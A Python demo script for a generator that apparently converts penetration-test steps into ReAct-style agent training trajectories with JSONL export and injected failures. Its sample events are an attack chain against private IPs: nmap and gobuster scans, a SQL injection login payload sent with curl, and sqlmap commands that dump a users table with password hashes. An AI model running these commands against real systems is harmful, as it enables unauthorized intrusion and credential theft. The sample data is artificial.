#!/usr/bin/env python3
"""
Demo script showing ReAct-format trajectory generation.
Run this to see example output from the system.
"""

import json
from src.models import (
    AttackEvent, StepType, ToolName,
    ConversationTurn, ConversationRole
)
from src.generators import ReActTrajectoryGenerator


def demo_basic():
    """Demo with simple attack events."""
    print("=" * 60)
    print("DEMO: Basic ReAct Trajectory Generation")
    print("=" * 60)
    
    # Sample attack events mimicking a web application penetration test
    events = [
        AttackEvent(
            step_type=StepType.ENUMERATION,
            observation="Target requires enumeration",
            command="nmap 192.168.1.10 -p- -sV",
            output="""Starting Nmap 7.92
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41
443/tcp closed https""",
            reasoning="Scan all ports to find attack surface",
            tool_used=ToolName.NMAP,
            target="192.168.1.10",
            success=True,
            metadata={"initial_obs": "Target 192.168.1.10 is alive. No prior knowledge."}
        ),
        AttackEvent(
            step_type=StepType.ENUMERATION,
            observation="Found web server on port 80",
            command="gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt",
            output="""/admin (200 OK)
/backup (403 Forbidden)
/uploads (301 Moved Permanently)
/login.php (200 OK)""",
            reasoning="Directory brute-force to find hidden endpoints",
            tool_used=ToolName.GOBUSTER,
            target="192.168.1.10",
            success=True
        ),
        AttackEvent(
            step_type=StepType.EXPLOITATION,
            observation="Found login form",
            command="curl -X POST http://192.168.1.10/login.php -d \"username=admin' OR '1'='1&password=admin\"",
            output="""SQL error: You have an error in your SQL syntax""",
            reasoning="Test SQL injection on login form",
            tool_used=ToolName.CURL,
            target="192.168.1.10",
            success=True
        ),
        AttackEvent(
            step_type=StepType.EXPLOITATION,
            observation="SQL injection confirmed",
            command="sqlmap -u http://192.168.1.10/login.php --data \"username=admin&password=admin\" --dbs",
            output="""[INFO] testing 'MySQL >= 5.0.12 OR time-based'
[INFO] the parameter is vulnerable
[INFO] extracting database 'users'
Database: webapp
Table: users
[2 columns: id, username, password]""",
            reasoning="SQLmap to exploit SQL injection",
            tool_used=ToolName.SQLMAP,
            target="192.168.1.10",
            success=True
        ),
        AttackEvent(
            step_type=StepType.POST_EXPLOITATION,
            observation="Got admin password hash",
            command="sqlmap -u http://192.168.1.10/login.php --data \"username=admin&password=admin\" --dump -T users",
            output="""id | username | password
1  | admin   | $2y$10$xxxxx
2  | test    | $2y$10$xxxxx""",
            reasoning="Dump user credentials",
            tool_used=ToolName.SQLMAP,
            target="192.168.1.10",
            success=True
        ),
    ]
    
    # Generate trajectories
    generator = ReActTrajectoryGenerator()
    trajectories = generator.generate(events, {"min_steps": 3, "max_steps": 30})
    
    # Print output
    for traj in trajectories:
        print(f"\n--- Trajectory: {traj.id} ---")
        
        for conv in traj.conversations:
            role = conv.from_role.value.upper()
            value = conv.value
            
            if role == "HUMAN":
                # User message
                print(f"\nUser:")
                print(f"  {value}")
            elif role == "ASSISTANT":
                # Agent message with Thought/Action
                print(f"\nAgent:")
                # Print with proper formatting
                for line in value.split("\n"):
                    print(f"  {line}")
            elif role == "TOOL":
                # Tool (actually shown as Observation)
                print(f"\nObservation:")
                print(f"  {value[:200]}...")
        
        print(f"\n\nMetadata:")
        print(f"  Success: {traj.success}")
        print(f"  Steps: {traj.total_steps}")
        print(f"  Tools: {[t.value for t in traj.tools_used]}")
        print(f"  Difficulty: {traj.difficulty.value if traj.difficulty else 'N/A'}")


def demo_jsonl_export():
    """Demo JSONL export format."""
    print("\n" + "=" * 60)
    print("DEMO: JSONL Export Format")
    print("=" * 60)
    
    # Sample events
    events = [
        AttackEvent(
            step_type=StepType.ENUMERATION,
            observation="Initial scan",
            command="nmap 10.0.0.5 -p-",
            output="PORT  STATE\n22   open\n80   open",
            reasoning="Port scan",
            tool_used=ToolName.NMAP,
            target="10.0.0.5",
            success=True,
            metadata={}
        ),
        AttackEvent(
            step_type=StepType.ENUMERATION,
            observation="Web enum",
            command="gobuster dir -u http://10.0.0.5",
            output="/admin /login /api",
            reasoning="Directory enum",
            tool_used=ToolName.GOBUSTER,
            target="10.0.0.5",
            success=True,
            metadata={}
        ),
    ]
    
    generator = ReActTrajectoryGenerator()
    trajectories = generator.generate(events)
    
    # Export as JSONL
    for traj in trajectories:
        data = {
            "id": traj.id,
            "conversations": [
                {"from": c.from_role.value, "value": c.value}
                for c in traj.conversations
            ],
            "metadata": {
                "source": traj.source_origin or "demo",
                "category": traj.category.value if traj.category else "web",
                "success": traj.success
            }
        }
        print("\n" + json.dumps(data, indent=2)[:1000] + "...")


def demo_with_failures():
    """Demo with failure injection."""
    print("\n" + "=" * 60)
    print("DEMO: Failure Injection (30% of trajectories)")
    print("=" * 60)
    
    events = [
        AttackEvent(
            step_type=StepType.ENUMERATION,
            observation="Initial scan",
            command="nmap 192.168.1.50 -p-",
            output="PORT  STATE\n22   open SSH\n80   open HTTP",
            reasoning="Scan target",
            tool_used=ToolName.NMAP,
            target="192.168.1.50",
            success=True,
            metadata={}
        ),
        AttackEvent(
            step_type=StepType.EXPLOITATION,
            observation="Try exploit",
            command="searchsploit apache 2.4.41",
            output="No results found",
            reasoning="Search for exploits",
            tool_used=ToolName.NMAP,
            target="192.168.1.50",
            success=False,  # Failed
            error_message="No matching exploit available",
            metadata={}
        ),
    ]
    
    generator = ReActTrajectoryGenerator()
    trajectories = generator.generate(events)
    
    from src.generators import ReactFailureInjector
    injector = ReactFailureInjector(0.30)
    
    for traj in trajectories:
        traj = injector.inject(traj)  # May inject failure
        
        print(f"\n--- Trajectory (failure_injected: {not traj.success}) ---")
        
        for conv in traj.conversations[-3:]:
            role = conv.from_role.value.upper()
            print(f"\n{role}: {conv.value[:150]}...")


if __name__ == "__main__":
    # Run demos
    demo_basic()
    demo_jsonl_export()
    demo_with_failures()
    
    print("\n" + "=" * 60)
    print("DEMO COMPLETE")
    print("=" * 60)
    print("""
Example API usage:

curl -X POST http://localhost:8000/generate/react \\
  -H "Content-Type: application/json" \\
  -d '{
    "events": [
      {
        "step_type": "enumeration",
        "command": "nmap 192.168.1.10 -p-",
        "output": "PORT  STATE\\n22   open",
        "success": true,
        "tool": "nmap"
      }
    ],
    "min_steps": 3,
    "max_steps": 30,
    "failure_rate": 0.30
  }'
""")